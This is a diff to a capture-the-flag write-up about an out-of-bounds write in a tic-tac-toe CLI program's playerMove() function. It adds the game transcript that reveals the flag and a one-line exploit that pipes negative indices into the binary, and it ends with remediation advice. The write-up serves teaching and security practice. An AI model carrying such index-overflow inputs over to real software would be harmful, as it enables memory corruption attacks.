@@ -5,7 +5,7 @@ This challenge provides a Linux CLI program with an out-of-bounds write vulnerab
 
 Artifacts:
 - `chall/chall`: vulnerable executable program provided by the challenge authors
-- `chall/chall.c`:  vulnerable program source code provided by challenge authors
+- `chall/chall.c`: vulnerable program source code provided by challenge authors
 
 ## Context 
 
@@ -28,6 +28,9 @@ Enter row #(1-3):
 The `chall` program contains an out-of-bounds write vulnerability due to an improper check of the index within the `playerMove()` function.
 
 ```
+char player = 'X';
+char computer = 'O';
+...
 void playerMove() {
    int x, y;
    do{
@@ -77,6 +80,25 @@ Enter column #(1-3): -4
 ```
 
 After entering these inputs, the computer writes `X` instead of `O`, confirming that the `computer` variable was successfully overwritten. By continuing this game, both the user and the computer will be playing `X`, leading to a guaranteed win.
+
+To finish the game, we can continue by inputting any value for `x` and `y` as the computer would play the game for us anyways.
+
+One example could be to continue with `x=1, y=1` which would prompt the computer to finish the diagonal line for us.
+```
+Enter row #(1-3): 1
+Enter column #(1-3): 1
+
+ X |   |   
+---|---|---
+   | X |   
+---|---|---
+   |   | X 
+
+How's this possible? Well, I guess I'll have to give you the flag now.
+lactf{REDACTED}
+```
+
+For automatic exploitation, we can run `echo -e "-5\n-4\n1\n1" | ./chall` to retrieve the flag from inside the ./chall folder.
 
 ## Remediation
 The program should validate user input rather than relying solely on the calculated index value. It can instead check that `row` and `column` are within the range [1, 3].
